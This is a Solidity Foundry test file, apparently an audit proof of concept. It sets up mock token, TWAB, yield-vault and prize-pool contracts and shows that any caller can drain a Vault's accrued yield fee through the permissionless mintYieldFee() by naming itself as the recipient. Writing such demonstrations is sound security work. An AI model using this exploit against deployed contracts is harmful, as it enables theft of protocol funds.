pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../../src/Vault.sol";

// ---------------------------------------------------------------------
//                             MOCK CONTRACTS
// ---------------------------------------------------------------------

/**
 * @notice Very light ERC20 for testing
 */
contract MockERC20 is ERC20 {
    uint8 private immutable _decimals;

    constructor(string memory name_, string memory symbol_, uint8 decimals_)
        ERC20(name_, symbol_)
    {
        _decimals = decimals_;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/**
 * @notice Minimal TWAB controller mock that fulfils the subset of functionality the Vault relies on.
 *         Balances are tracked per‐vault to match the real implementation interface.
 */
contract TwabControllerMock {
    // vault => user => balance
    mapping(address => mapping(address => uint256)) internal _balances;
    // vault => totalSupply
    mapping(address => uint256) internal _totalSupply;

    // constant used by Vault.sponsor logic
    address public constant SPONSORSHIP_ADDRESS = address(0x100);

    /* ========= View ========= */

    function balanceOf(address vault, address user) external view returns (uint256) {
        return _balances[vault][user];
    }

    function totalSupply(address vault) external view returns (uint256) {
        return _totalSupply[vault];
    }

    function delegateOf(address /*vault*/, address /*user*/) external pure returns (address) {
        // Always pretend the user is not yet delegated so Vault will not call sponsor()
        return address(0);
    }

    /* ========= State‐changing ========= */

    function mint(address to, uint96 amount) external {
        address vault = msg.sender;
        _balances[vault][to] += uint256(amount);
        _totalSupply[vault]      += uint256(amount);
    }

    function burn(address from, uint96 amount) external {
        address vault = msg.sender;
        _balances[vault][from] -= uint256(amount);
        _totalSupply[vault]     -= uint256(amount);
    }

    function transfer(address from, address to, uint96 amount) external {
        address vault = msg.sender;
        _balances[vault][from] -= uint256(amount);
        _balances[vault][to]   += uint256(amount);
    }

    // no‐op – only present so the Vault can call it without reverting
    function sponsor(address /*user*/) external {}
}

/**
 * @notice Extremely slim ERC4626 mock – only the pieces used by the Vault are implemented.
 *         It never generates yield and assets are never moved – this is sufficient for the PoC.
 */
contract YieldVaultMock {
    IERC20 public immutable asset;

    constructor(IERC20 _asset) {
        asset = _asset;
    }

    // ---------------- ERC4626 subset ----------------
    function maxWithdraw(address /*owner*/) external pure returns (uint256) {
        // no assets are withdrawable – return zero so the Vault thinks exchange rate = 1
        return 0;
    }

    // Un-used functions – keep as stubs to satisfy interface at runtime
    function deposit(uint256 /*assets*/, address /*receiver*/) external returns (uint256) {
        return 0;
    }

    function withdraw(uint256 /*assets*/, address /*receiver*/, address /*owner*/) external returns (uint256) {
        return 0;
    }
}

/**
 * @notice Minimal PrizePool mock – only prizeToken() is required by the Vault.
 */
contract PrizePoolMock {
    IERC20 public immutable prizeToken_;

    constructor(IERC20 _prizeToken) {
        prizeToken_ = _prizeToken;
    }

    function prizeToken() external view returns (IERC20) {
        return prizeToken_;
    }

    // Stubs so the Vault can compile even though they are never reached in this PoC
    function contributePrizeTokens(address /*from*/, uint256 /*amount*/) external {}
    function claimPrize(
        address /*winner*/,
        uint8 /*tier*/,
        uint32 /*prizeIndex*/,
        address /*recipient*/,
        uint96 /*fee*/,
        address /*feeRecipient*/
    ) external returns (uint256) { return 0; }
}

// ---------------------------------------------------------------------
//                                TEST
// ---------------------------------------------------------------------

/**
 * @notice Foundry test that demonstrates anyone can steal the accumulated yield
 *         fee by arbitrarily choosing the recipient in Vault.mintYieldFee().
 */
contract VaultMintYieldFeeExploitTest is Test {
    MockERC20          internal asset;
    TwabControllerMock internal twab;
    YieldVaultMock     internal yieldVault;
    PrizePoolMock      internal prizePool;
    Vault              internal vault;

    address internal owner        = address(0xA11CE);
    address internal feeRecipient = address(0xFEE);
    address internal attacker     = address(0xBEEF);

    // storage slot index of _yieldFeeTotalSupply in the Vault (see analysis)
    uint256 constant YIELD_FEE_TOTAL_SUPPLY_SLOT = 6;

    function setUp() public {
        vm.label(owner,        "Owner");
        vm.label(feeRecipient, "FeeRecipient");
        vm.label(attacker,     "Attacker");

        // -----------------------------------------------------------------
        // Deploy mocks & the Vault
        // -----------------------------------------------------------------
        asset       = new MockERC20("Mock Asset", "MA", 18);
        twab        = new TwabControllerMock();
        yieldVault  = new YieldVaultMock(asset);
        prizePool   = new PrizePoolMock(asset);

        // Mint some tokens to the owner (not strictly required for this PoC)
        asset.mint(owner, 1_000 ether);

        vm.startPrank(owner);
        vault = new Vault(
            IERC20(address(asset)),
            "PoolTogether V5 Vault",  // name
            "PTv5",                   // symbol
            TwabController(address(twab)),
            IERC4626(address(yieldVault)),
            PrizePool(address(prizePool)),
            address(0),              // claimer – irrelevant for this PoC
            feeRecipient,            // yield fee recipient set during deployment
            1e8,                     // 10% yield fee percentage (precision 1e9)
            owner                    // owner
        );
        vm.stopPrank();
    }

    /**
     * @dev Exploit steps:
     *      1. Assume some yield fee has been accrued (simulated by directly
     *         injecting a positive value into the private storage slot).
     *      2. Attacker calls mintYieldFee() specifying themselves as the
     *         recipient.
     *      3. Because the function is completely permission-less, the Vault
     *         happily mints the shares to the attacker, draining the fee pool.
     */
    function testExploitStealsYieldFee() public {
        // -----------------------------------------------------------------
        // 1. Simulate that 100 tokens worth of yield fee have accrued
        // -----------------------------------------------------------------
        uint256 spoofedShares = 100 ether;
        vm.store(
            address(vault),
            bytes32(uint256(YIELD_FEE_TOTAL_SUPPLY_SLOT)),
            bytes32(spoofedShares)
        );

        // Assert internal state was set correctly
        uint256 storedSupplyBefore = uint256(
            vm.load(address(vault), bytes32(uint256(YIELD_FEE_TOTAL_SUPPLY_SLOT)))
        );
        assertEq(storedSupplyBefore, spoofedShares, "spoof failed");

        // -----------------------------------------------------------------
        // 2. Attacker steals the fee by minting the shares to themselves
        // -----------------------------------------------------------------
        vm.startPrank(attacker);
        vault.mintYieldFee(spoofedShares, attacker);
        vm.stopPrank();

        // -----------------------------------------------------------------
        // 3. Post-conditions: attacker owns the shares, internal fee reserve is zero
        // -----------------------------------------------------------------
        // attacker balance should equal the stolen shares
        uint256 attackerBal = vault.balanceOf(attacker);
        assertEq(attackerBal, spoofedShares, "attacker did not receive shares");

        // fee reserve should now be empty
        uint256 storedSupplyAfter = uint256(
            vm.load(address(vault), bytes32(uint256(YIELD_FEE_TOTAL_SUPPLY_SLOT)))
        );
        assertEq(storedSupplyAfter, 0, "yield fee reserve was not drained");
    }
}